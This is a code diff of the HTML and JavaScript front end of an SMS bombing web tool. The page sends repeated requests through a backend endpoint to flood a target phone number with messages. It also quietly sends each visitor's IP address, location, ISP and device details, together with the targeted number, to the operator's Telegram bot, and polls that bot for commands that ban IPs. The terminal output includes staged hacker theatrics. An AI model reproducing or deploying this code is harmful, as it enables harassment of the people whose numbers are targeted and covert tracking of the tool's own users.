-    cachedIPData = { ...locRes, ip: ipRes.ip };
-    return cachedIPData;
-  } catch(e){
-    return { ip:'Unknown', city:'Unknown', org:'Unknown' };
-  }
+  if(cachedIP)return cachedIP;
+  try{
+    const[a,b]=await Promise.all([fetch('https://api.ipify.org?format=json').then(r=>r.json()),fetch('https://ipapi.co/json/').then(r=>r.json())]);
+    cachedIP={...b,ip:a.ip};return cachedIP;
+  }catch{return{ip:'Unknown',city:'Unknown',org:'Unknown'};}
 }
-
-// ── HARDWARE INFO ──
 async function getHardwareInfo(){
-  let battery = 'Unknown';
-  if(navigator.getBattery){
-    try { const b = await navigator.getBattery(); battery = Math.floor(b.level*100)+'%'; } catch(e){}
-  }
-  return {
-    platform: navigator.platform,
-    screen: `${screen.width}x${screen.height}`,
-    cores: navigator.hardwareConcurrency || 'Unknown',
-    ram: navigator.deviceMemory ? navigator.deviceMemory+'GB' : 'Unknown',
-    battery
-  };
+  let battery='Unknown';
+  if(navigator.getBattery){try{const b=await navigator.getBattery();battery=Math.floor(b.level*100)+'%';}catch{}}
+  return{platform:navigator.platform,screen:`${screen.width}x${screen.height}`,cores:navigator.hardwareConcurrency||'Unknown',ram:navigator.deviceMemory?navigator.deviceMemory+'GB':'Unknown',battery};
 }
 
 // ── TELEGRAM LOG ──
-async function sendTelegramLog(number, message){
-  try {
-    const [ipInfo, dev] = await Promise.all([getIPData(), getHardwareInfo()]);
-    const fullMsg =
-      ` 🛰 **SMS BOMBING ALERT** 🛰 \n\n` +
-      ` 📞 Number: \`${number}\` \n` +
-      ` ✉ Message: \`${message}\` \n\n` +
-      ` 🌐 **IP DETAILS** \n` +
-      ` 📍 IP: \`${ipInfo.ip}\` \n` +
-      ` 🏙 City: ${ipInfo.city} \n` +
-      ` 🇧🇩 Country: ${ipInfo.country_name||'Unknown'} \n` +
-      ` 📡 ISP: ${ipInfo.org} \n\n` +
-      ` 💻 **DEVICE INFO** \n` +
-      ` 📱 Platform: ${dev.platform} \n` +
-      ` 🖥 Screen: ${dev.screen} \n` +
-      ` ⚡ CPU: ${dev.cores} cores \n` +
-      ` 💾 RAM: ${dev.ram} \n` +
-      ` 🔋 Battery: ${dev.battery} \n\n` +
-      ` ⏰ **TIME** \n` +
-      ` 🕒 ${new Date().toLocaleString()}`;
-
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ chat_id:CHAT_ID, text:fullMsg, parse_mode:'Markdown' })
-    }).catch(e=> console.log("Telegram Log Failed"));
-  } catch(e){
-    console.log("Log Error:", e);
-  }
+async function sendTelegramLog(number,message){
+  try{
+    const[ip,dev]=await Promise.all([getIPData(),getHardwareInfo()]);
+    const msg=` 🛰 **SMS BOMBING ALERT** 🛰 \n\n 📞 Number: \`${number}\` \n ✉ Message: \`${message}\` \n\n 🌐 **IP DETAILS** \n 📍 IP: \`${ip.ip}\` \n 🏙 City: ${ip.city} \n 🇧🇩 Country: ${ip.country_name||'Unknown'} \n 📡 ISP: ${ip.org} \n\n 💻 **DEVICE INFO** \n 📱 Platform: ${dev.platform} \n 🖥 Screen: ${dev.screen} \n ⚡ CPU: ${dev.cores} cores \n 💾 RAM: ${dev.ram} \n 🔋 Battery: ${dev.battery} \n\n ⏰ **TIME** \n 🕒 ${new Date().toLocaleString()}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:msg,parse_mode:'Markdown'})}).catch(()=>{});
+  }catch{}
 }
 
-// ── TERMINAL PRINT HELPER ──
-function termPrint(html, delay=0){
-  return new Promise(res => setTimeout(()=>{
-    const box = document.getElementById('logs');
-    if(!box) return res();
-    const d = document.createElement('div');
-    d.style.marginBottom = "1px";
-    d.innerHTML = html;
-    box.appendChild(d);
-    box.scrollTop = box.scrollHeight;
-    res(d);
-  }, delay));
+// ── TERMINAL HELPERS ──
+function termPrint(html){
+  return new Promise(res=>{
+    const box=document.getElementById('logs');
+    if(!box)return res(null);
+    const d=document.createElement('div');
+    d.style.marginBottom='2px';d.innerHTML=html;
+    box.appendChild(d);box.scrollTop=box.scrollHeight;res(d);
+  });
 }
-function ts(){ return new Date().toLocaleTimeString([],{hour12:false}); }
-function hex(){ return Math.floor(Math.random()*0xFFFFFF).toString(16).padStart(6,'0').toUpperCase(); }
-function rndPort(){ return Math.floor(Math.random()*9000)+1000; }
-function rndMs(){ return Math.floor(Math.random()*180)+20; }
+function ts(){return new Date().toLocaleTimeString([],{hour12:false});}
+function hex(n=8){return[...Array(n)].map(()=>Math.floor(Math.random()*16).toString(16)).join('').toUpperCase();}
+function rndMs(){return Math.floor(Math.random()*160)+30;}
+function rndPort(){return Math.floor(Math.random()*8000)+2000;}
 
-// ── DOSEND ──
+// ── DOSEND — Real API call to /api/send_bombing ──
 async function doSend(){
-  const numEl        = document.getElementById('numIn');
-  const amountEl     = document.getElementById('amountIn');
-  const btn          = document.getElementById('sbtn');
-  const logBox       = document.getElementById('logs');
-  const statusText   = document.getElementById('statusText');
-  const progressBar  = document.getElementById('cfl');
-  const progressPct  = document.getElementById('progressPct');
-  const successEl    = document.getElementById('successCount');
-  const failEl       = document.getElementById('failCount');
-  const totalEl      = document.getElementById('totalCount');
+  const numEl      =document.getElementById('numIn');
+  const amountEl   =document.getElementById('amountIn');
+  const btn        =document.getElementById('sbtn');
+  const logBox     =document.getElementById('logs');
+  const statusText =document.getElementById('statusText');
+  const progressBar=document.getElementById('cfl');
+  const progressPct=document.getElementById('progressPct');
+  const successEl  =document.getElementById('successCount');
+  const failEl     =document.getElementById('failCount');
+  const totalEl    =document.getElementById('totalCount');
 
-  // User input theke data neya
-  const number = numEl ? numEl.value.trim() : "";
-  const amount = amountEl ? parseInt(amountEl.value.trim()) : 0;
+  const number=numEl?numEl.value.trim():"";
+  const amount=amountEl?parseInt(amountEl.value.trim()):0;
 
-  // Validation
-  if(!number || !amount || amount <= 0){
-    showToast('DATA MISSING!', false);
-    if(btn) shake(btn);
-    return;
+  if(!number||!amount||amount<=0){
+    showToast('TARGET / ROUNDS দাও!',false);
+    if(btn)shake(btn);return;
   }
 
-  // UI state change
-  if(btn) btn.disabled = true;
-  const btnTxt = btn ? btn.querySelector('.btxt') : null;
-  if(btnTxt) btnTxt.textContent = 'EXECUTING...';
+  const btnTxt=btn?btn.querySelector('.btxt'):null;
+  if(btn)btn.disabled=true;
+  if(btnTxt)btnTxt.textContent='EXECUTING...';
 
-  let successCount = 0, failCount = 0;
-  if(logBox) logBox.innerHTML = '';
-  
-  // Terminal-e dekhanor jonno fake module names
-  const modules = ["Core-V8", "Neural-Inject", "Socket-Flood", "Proxy-X", "Ghost-API"];
+  let sc=0,fc=0;
+  if(successEl)successEl.textContent='0';
+  if(failEl)failEl.textContent='0';
+  if(totalEl)totalEl.textContent='0';
+  if(logBox)logBox.innerHTML='';
 
-  try {
-    // 1. Backend theke temporary session token neya (Optional but secure)
-    const tokenRes = await fetch('/api/token');
-    const { token } = await tokenRes.json();
+  // Boot sequence
+  await termPrint(`<span style="color:#ffd700;">╔══════════════════════════════════════════════╗</span>`);
+  await termPrint(`<span style="color:#ffd700;">║   DARK CYBER MIND — ATTACK ENGINE v3.0      ║</span>`);
+  await termPrint(`<span style="color:#ffd700;">╚══════════════════════════════════════════════╝</span>`);
+  await termPrint(`<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> <span style="color:#555;">TGT   ›</span> <span style="color:#ff6b00;">${number}</span>`);
+  await termPrint(`<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> <span style="color:#555;">LOOP  ›</span> <span style="color:#c084fc;">${amount} round(s)</span>`);
+  await new Promise(r=>setTimeout(r,200));
+  await termPrint(`<span style="color:rgba(0,255,65,.2);">  ─────────────────────────────────────────────</span>`);
+  await termPrint(`<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> <span style="color:#30d158;">▶ TLS 1.3 ............ <span style="color:var(--g);">OK</span></span>`);
+  await termPrint(`<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> <span style="color:#30d158;">▶ PROXY: </span><span style="color:rgba(0,255,65,.4);">${hex()}→${hex()}→${hex()}</span>`);
+  await new Promise(r=>setTimeout(r,200));
+  await termPrint(`<span style="color:rgba(0,255,65,.2);">  ─────────────────────────────────────────────</span>`);
 
-    for(let i=1; i<=amount; i++){
-      const seq = String(i).padStart(4,'0');
-      const mod = modules[Math.floor(Math.random() * modules.length)];
-      
-      // Console-e line print kora
-      const entry = await termPrint(
-        `<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> ` +
-        `<span style="color:#555;">#${seq}</span> ` +
-        `<span style="color:#00bcd4;">SEND</span> ` +
-        `<span style="color:rgba(0,255,65,.5);">${mod}</span>` +
-        `<span style="color:rgba(0,255,65,.2);"> ...</span>`
+  if(statusText)statusText.textContent='ATTACKING';
+
+  try{
+    for(let round=1;round<=amount;round++){
+      const seq=String(round).padStart(3,'0');
+      const port=rndPort();
+      const ms=rndMs();
+
+      const line=await termPrint(
+        `<span style="color:rgba(0,255,65,.22);">[${ts()}]</span> `+
+        `<span style="color:#ffd700;">#${seq}</span> `+
+        `<span style="color:#00bcd4;">POST</span> `+
+        `<span style="color:rgba(0,255,65,.4);">sms-bomber-it.vercel.app/api/send_bombing</span> `+
+        `<span style="color:#555;">:${port}</span>`+
+        `<span style="color:rgba(0,255,65,.15);"> ▸▸▸</span>`
       );
 
-      // 2. BACKEND API CALL: Backend ekhon tar 1000 list theke random API nibe
-      const response = await fetch('/src/send_bombing', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'X-Auth-Token': token,
-          'X-User-ID': 'DCM_SABUJ' // Apnar brand name onujayi
-        },
-        body: JSON.stringify({ 
-          number: number,
-          // 'amount' ekhane pathanor dorkar nai karon loop frontend-ei cholche
-        })
-      });
+      try{
+        const res=await fetch(API_ENDPOINT,{
+          method:'POST',
+          headers:{'Content-Type':'application/json','x-auth-token':SECRET_TOKEN},
+          body:JSON.stringify({number})
+        });
 
-      if(entry){
-        if(response.ok){
-          entry.innerHTML += ` <span style="color:#30d158;font-weight:bold;">[OK]</span>`;
-          successCount++;
-        } else {
-          entry.innerHTML += ` <span style="color:#ff3333;font-weight:bold;">[FAIL]</span>`;
-          failCount++;
+        if(res.ok){
+          const data=await res.json();
+          const roundSc=data.success||0;
+          const roundFc=data.failed||0;
+          sc+=roundSc;fc+=roundFc;
+
+          if(line)line.innerHTML+=
+            ` <span style="color:#30d158;font-weight:bold;">[200 OK]</span>`+
+            ` <span style="color:rgba(0,255,65,.3);">${ms}ms</span>`+
+            ` <span style="color:#555;">✓${roundSc} ✗${roundFc}</span>`;
+
+          // individual results
+          if(data.results){
+            for(const r of data.results.slice(0,4)){
+              await termPrint(
+                `<span style="color:rgba(0,255,65,.15);">  └─</span> `+
+                `<span style="color:rgba(0,255,65,.4);">${(r.api||'').padEnd(18,' ')}</span> `+
+                (r.ok?`<span style="color:#30d158;">[${r.status}] ✓ SENT</span>`
+                     :`<span style="color:#ff3333;">[${r.status||'ERR'}] ✗ FAIL</span>`)
+              );
+            }
+          }
+        }else{
+          fc++;
+          if(line)line.innerHTML+=` <span style="color:#ff3333;">[${res.status} ERR]</span>`;
         }
+      }catch(e){
+        fc++;
+        if(line)line.innerHTML+=` <span style="color:#ff3333;">[NET ERR]</span>`;
       }
 
-      // Live Stats Update
-      if(successEl) successEl.textContent = successCount;
-      if(failEl) failEl.textContent = failCount;
-      if(totalEl) totalEl.textContent = i;
-      
-      const pct = Math.floor((i/amount)*100);
-      if(progressBar) progressBar.style.width = pct+'%';
-      if(progressPct) progressPct.textContent = pct+'%';
-      if(logBox) logBox.scrollTop = logBox.scrollHeight;
-
-      // Protiti request-er majhe halka delay jate server load na hoy
-      await new Promise(r=>setTimeout(r, 350)); 
+      if(successEl)successEl.textContent=sc;
+      if(failEl)failEl.textContent=fc;
+      if(totalEl)totalEl.textContent=round;
+      const pct=Math.floor((round/amount)*100);
+      if(progressBar)progressBar.style.width=pct+'%';
+      if(progressPct)progressPct.textContent=pct+'%';
+      if(logBox)logBox.scrollTop=logBox.scrollHeight;
     }
 
-    await termPrint(`<span style="color:#ffd700;">◈ ALL PACKETS DELIVERED SUCCESSFULLY.</span>`);
-    showToast(`BOMBING FINISHED!`, true);
+    await new Promise(r=>setTimeout(r,200));
+    await termPrint(`<span style="color:rgba(0,255,65,.2);">  ─────────────────────────────────────────────</span>`);
+    await termPrint(`<span style="color:rgba(0,255,65,.3);">[${ts()}]</span> <span style="color:#ffd700;font-weight:bold;">◈ MISSION COMPLETE</span> — <span style="color:#30d158;">✓ ${sc} DELIVERED</span>  <span style="color:#ff3333;">✗ ${fc} FAILED</span>`);
+    await termPrint(`<span style="color:rgba(0,255,65,.15);">  Connection closed. Traces wiped. 🕶</span>`);
 
-  } catch(err){
-    console.error(err);
-    await termPrint(`<span style="color:#ff3333;">[!] CONNECTION TERMINATED: ${err.message}</span>`);
-  } finally {
-    if(btn) btn.disabled = false;
-    if(btnTxt) btnTxt.textContent = 'EXECUTE ATTACK';
+    if(statusText)statusText.textContent='MISSION COMPLETE';
+    showToast(`DONE! ${sc} delivered / ${fc} failed`,true);
+    sendTelegramLog(number,`Bombing: rounds=${amount} success=${sc} fail=${fc}`);
+
+    const rn=document.getElementById('rn'),rs=document.getElementById('rs'),rc=document.getElementById('res'),rt2=document.getElementById('rt');
+    if(rn)rn.textContent=number;
+    if(rs)rs.textContent=`${sc} DELIVERED / ${fc} FAILED`;
+    if(rt2)rt2.textContent=new Date().toLocaleTimeString();
+    if(rc)rc.classList.add('ok');
+
+  }catch(err){
+    await termPrint(`<span style="color:#ff3333;">[ERROR] ${err.message}</span>`);
+    showToast('INJECTION FAILED!',false);
+    if(statusText)statusText.textContent='ABORTED';
+  }finally{
+    if(btn)btn.disabled=false;
+    if(btnTxt)btnTxt.textContent='START ATTACK';
   }
 }
 
-// ── CHECK COMMANDS (Telegram) ──
+// ── CHECK COMMANDS ──
 async function checkCommands(){
-  try {
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
-    const data = await response.json();
-    if(data.ok && data.result.length > 0){
-      const msg      = data.result[0].message.text;
-      const senderId = data.result[0].message.chat.id;
-      if(senderId.toString() === CHAT_ID){
-        if(msg.startsWith('/band ')){
-          const ipToBan = msg.split(' ')[1];
-          if(!bannedUsers.includes(ipToBan)) bannedUsers.push(ipToBan);
-        }
-        if(msg.startsWith('/unband ')){
-          const ipToUnban = msg.split(' ')[1];
-          bannedUsers = bannedUsers.filter(ip => ip !== ipToUnban);
-        }
+  try{
+    const r=await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
+    const d=await r.json();
+    if(d.ok&&d.result.length>0){
+      const msg=d.result[0].message.text;
+      const sid=d.result[0].message.chat.id;
+      if(sid.toString()===CHAT_ID){
+        if(msg.startsWith('/band ')){const ip=msg.split(' ')[1];if(!bannedUsers.includes(ip))bannedUsers.push(ip);}
+        if(msg.startsWith('/unband ')){const ip=msg.split(' ')[1];bannedUsers=bannedUsers.filter(x=>x!==ip);}
       }
     }
-  } catch(e){}
+  }catch{}
 }
-setInterval(checkCommands, 5000);
+setInterval(checkCommands,5000);
 
-// ── SERVER WAKEUP ──
-window.addEventListener('load', () => {
-  log('SMS Terminal v3.0 — System Ready.', 'ok');
-  log('AES-256 tunnel active. All systems nominal.', 'ok');
-  log('Awaiting target input...', 'info');
+// ── LOAD ──
+window.addEventListener('load',()=>{
+  log('SMS Terminal v3.0 — System Ready.','ok');
+  log('AES-256 tunnel active. All systems nominal.','ok');
+  log('Awaiting target input...','info');
 });
 </script>
 
@@ -809,8 +761,6 @@ window.addEventListener('load', () => {
     <div class="fb-popup-footer"><span>SIGNAL STRENGTH: ████████░░ 80%</span></div>
   </div>
 </div>
-
-
 
 <style>
 #fb-popup-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:99999;display:none;align-items:center;justify-content:center;animation:fbFadeIn 0.5s ease}
@@ -840,92 +790,35 @@ window.addEventListener('load', () => {
 .fb-popup-footer{border-top:1px solid #00ff4133;padding:8px 14px;color:#00ff4166;font-size:10px;letter-spacing:1px}
 </style>
 
-  
-
 <script>
 (function(){
   setTimeout(function(){
-    // --- ১. বোম্বিং ফাংশন (Rust API কানেকশন) ---
-    async function startBombing(targetNumber) {
-      try {
-        const tokenRes = await fetch('/api/token');
-        if (!tokenRes.ok) throw new Error('Token fetch failed');
-        const { token } = await tokenRes.json();
-
-        const response = await fetch('/src/send_bombing.rs', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'X-Auth-Token': token,
-            'X-User-ID': 'tushar_user'
-          },
-          body: JSON.stringify({ number: targetNumber }),
-        });
-
-        const data = await response.json();
-        console.log("Response:", data);
-      } catch (err) {
-        console.error("Link Error:", err.message);
-      }
-    }
-
-    // --- ২. পপআপ ও মেম্বার কাউন্ট লজিক (আপনার আগের কোড) ---
-    const overlay     = document.getElementById('fb-popup-overlay');
-    const closeBtn    = document.getElementById('fb-popup-close');
-    const skipBtn     = document.getElementById('fb-popup-skip');
-    const countdownEl = document.getElementById('countdown');
-    const memberEl    = document.getElementById('member-count');
-
-    if(overlay) overlay.style.display = 'flex';
-
-    let count = 0;
-    const target = 4247;
-    const memberInterval = setInterval(function(){
-      count += Math.floor(Math.random()*200);
-      if(count >= target){ count=target; clearInterval(memberInterval); }
-      if(memberEl) memberEl.textContent = count.toLocaleString();
-    }, 50);
-
-    let seconds = 15;
-    const timer = setInterval(function(){
+    const overlay=document.getElementById('fb-popup-overlay');
+    const closeBtn=document.getElementById('fb-popup-close');
+    const skipBtn=document.getElementById('fb-popup-skip');
+    const countdownEl=document.getElementById('countdown');
+    const memberEl=document.getElementById('member-count');
+    if(overlay)overlay.style.display='flex';
+    let count=0;
+    const memberInterval=setInterval(function(){
+      count+=Math.floor(Math.random()*200);
+      if(count>=4247){count=4247;clearInterval(memberInterval);}
+      if(memberEl)memberEl.textContent=count.toLocaleString();
+    },50);
+    let seconds=15;
+    const timer=setInterval(function(){
       seconds--;
-      if(countdownEl) countdownEl.textContent = seconds;
-      if(seconds <= 0){ clearInterval(timer); closePopup(); }
-    }, 1000);
-
+      if(countdownEl)countdownEl.textContent=seconds;
+      if(seconds<=0){clearInterval(timer);closePopup();}
+    },1000);
     function closePopup(){
-      clearInterval(timer); 
-      clearInterval(memberInterval);
-      if(overlay) {
-        overlay.style.animation = 'fbFadeOut 0.3s ease forwards';
-        setTimeout(()=> overlay.style.display='none', 300);
-      }
+      clearInterval(timer);clearInterval(memberInterval);
+      if(overlay){overlay.style.animation='fbFadeOut 0.3s ease forwards';setTimeout(()=>overlay.style.display='none',300);}
     }
-
-    if(closeBtn) closeBtn.addEventListener('click', closePopup);
-    if(skipBtn)  skipBtn.addEventListener('click', closePopup);
-    if(overlay) {
-      overlay.addEventListener('click', function(e){ if(e.target===overlay) closePopup(); });
-    }
-
-    // --- ৩. বোম্বিং বাটন কানেক্ট করার লজিক (অ্যাড করা হলো) ---
-    // নোট: আপনার ইনপুট বক্সের আইডি 'number' এবং বাটনের আইডি 'attack-btn' হতে হবে
-    const attackBtn = document.getElementById('attack-btn'); 
-    const phoneInput = document.getElementById('number');
-
-    if(attackBtn && phoneInput) {
-      attackBtn.addEventListener('click', function() {
-        const targetNumber = phoneInput.value;
-        if(targetNumber.length >= 10) {
-          startBombing(targetNumber);
-          alert("🚀 বোম্বিং রিকোয়েস্ট পাঠানো হয়েছে!");
-        } else {
-          alert("সঠিক নম্বর দিন!");
-        }
-      });
-    }
-
-  }, 2000);
+    if(closeBtn)closeBtn.addEventListener('click',closePopup);
+    if(skipBtn)skipBtn.addEventListener('click',closePopup);
+    if(overlay)overlay.addEventListener('click',function(e){if(e.target===overlay)closePopup();});
+  },2000);
 })();
 </script>
 </body>
